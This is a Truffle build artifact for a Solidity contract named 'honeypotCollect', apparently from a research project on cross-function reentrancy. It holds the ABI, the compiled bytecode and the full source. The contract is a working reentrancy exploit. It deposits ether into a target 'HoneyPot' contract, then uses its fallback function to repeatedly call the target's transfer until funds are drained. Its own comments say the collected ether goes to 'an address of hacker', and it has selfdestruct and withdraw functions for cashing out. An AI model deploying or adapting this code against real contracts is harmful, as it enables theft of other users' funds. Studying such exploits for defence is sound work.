{
  "contractName": "honeypotCollect",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "honeypot",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_honeypot",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getOwner",
      "outputs": [
        {
          "name": "__owner",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "killAddress",
          "type": "address"
        }
      ],
      "name": "kill",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "maxIterations",
          "type": "uint256"
        }
      ],
      "name": "collect",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "withdrawAddress",
          "type": "address"
        },
        {
          "name": "withdrawAmount",
          "type": "uint256"
        }
      ],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50604051602080610a318339810180604052602081101561003057600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061095f806100d26000396000f3fe60806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063893d20e8146101ba578063cbf0b0c014610211578063ce3f865f14610262578063ef89aff314610290578063f3fef3a3146102e7575b346000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631101580156100b85750600254600154105b156101b857600180600082825401925050819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634847a79c33600260045481151561011957fe5b046040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561019f57600080fd5b505af11580156101b3573d6000803e3d6000fd5b505050505b005b3480156101c657600080fd5b506101cf610342565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561021d57600080fd5b506102606004803603602081101561023457600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061036c565b005b61028e6004803603602081101561027857600080fd5b810190808035906020019092919050505061044a565b005b34801561029c57600080fd5b506102a5610770565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156102f357600080fd5b506103406004803603604081101561030a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610795565b005b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141515610431576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b8073ffffffffffffffffffffffffffffffffffffffff16ff5b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561050f576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b6000600181905550806002819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663549262ba346040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b1580156105a357600080fd5b505af11580156105b7573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639b96eece336040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561067657600080fd5b505afa15801561068a573d6000803e3d6000fd5b505050506040513d60208110156106a057600080fd5b81019080805190602001909291905050506004819055506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16639507d39a600260045481151561070257fe5b046040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040180828152602001915050600060405180830381600087803b15801561075557600080fd5b505af1158015610769573d6000803e3d6000fd5b5050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561085a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260208152602001807f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e657281525060200191505060405180910390fd5b803073ffffffffffffffffffffffffffffffffffffffff16311115156108e8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260108152602001807f6e6f7420656e6f7567682066756e64730000000000000000000000000000000081525060200191505060405180910390fd5b8173ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f1935050505015801561092e573d6000803e3d6000fd5b50505056fea165627a7a72305820b2dc6733ad221c0924002f2e0d9101ca4532c6f24491093882768ef3df5bbada0029",
  "source": "pragma solidity ^0.5.0;\r\n\r\nimport \"./HoneyPot.sol\";\r\n// import \"openzeppelin-solidity/contracts/ownership/Ownable.sol\";\r\n\r\ncontract honeypotCollect {\r\n  HoneyPot public honeypot;\r\n  uint256 private _iteration;\r\n  uint256 private _maxIterations;\r\n  address private _owner;\r\n  uint private _ownBalance;\r\n  constructor (address payable _honeypot) public {\r\n    // pass an address will be the honeypot\r\n    honeypot = HoneyPot(_honeypot);\r\n    _owner = msg.sender;\r\n  }\r\n\r\n  function getOwner() public view returns (address __owner) {\r\n    __owner = _owner;\r\n  }\r\n\r\n  /**\r\n    * @dev Throws if called by any account other than the owner.\r\n    */\r\n  modifier onlyOwner() {\r\n      require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n      _;\r\n  }\r\n\r\n  // to get the collected ether to an address of hacker\r\n  // mechanism to destroy the honeypotCollect and send all ether containing in it to the address\r\n  function kill (address payable killAddress) public onlyOwner {\r\n    selfdestruct(killAddress);\r\n  }\r\n\r\n\r\n  // set the reentrancy attack in motion. It puts some ether in honeypot\r\n  function collect(uint256 maxIterations) payable public onlyOwner {\r\n    _iteration = 0;\r\n    _maxIterations = maxIterations;\r\n\r\n    honeypot.put.value(msg.value)();\r\n    _ownBalance = honeypot.getBalanceOf(msg.sender);\r\n    honeypot.get(_ownBalance/2);\r\n  }\r\n\r\n  function withdraw(address payable withdrawAddress, uint256 withdrawAmount)\r\n  public onlyOwner\r\n  {\r\n      require(address(this).balance > withdrawAmount, \"not enough funds\");\r\n\r\n      withdrawAddress.transfer(withdrawAmount);\r\n  }\r\n  // the fallback function is called whenever the honeypotCollect contract receives ether\r\n  function () payable external {\r\n    if (address(honeypot).balance >= msg.value && _iteration < _maxIterations) \r\n        {\r\n            _iteration += 1;\r\n\r\n            honeypot._transfer(msg.sender, _ownBalance/2);\r\n        }\r\n  }\r\n}\r\n",
  "sourcePath": "D:/Projects/research/truffle/cross-function-dao/contracts/HoneyPotCollect.sol",
  "compiler": {
    "name": "solc",
    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
  },
  "schemaVersion": "3.0.6",
  "updatedAt": "2019-05-15T23:06:03.825Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}